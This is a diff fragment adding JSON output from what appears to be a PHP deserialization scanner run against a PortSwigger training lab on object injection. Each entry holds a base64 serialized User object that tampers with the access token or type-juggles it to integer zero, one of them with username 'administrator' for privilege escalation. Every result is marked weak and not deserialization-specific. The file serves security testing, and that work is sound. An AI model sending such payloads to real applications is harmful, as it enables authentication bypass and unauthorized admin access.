+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjU6ImFkbWluIjt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2785,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjQ6InJvb3QiO30=",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2784,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjk6InN1cGVydXNlciI7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2789,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "type_juggle",
+          "chain": "access_token->i:0",
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2781,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "type_juggle_privesc",
+          "chain": "username=administrator + access_token=i:0",
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2577,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        }
+      ]
+    }
+  ]
+}
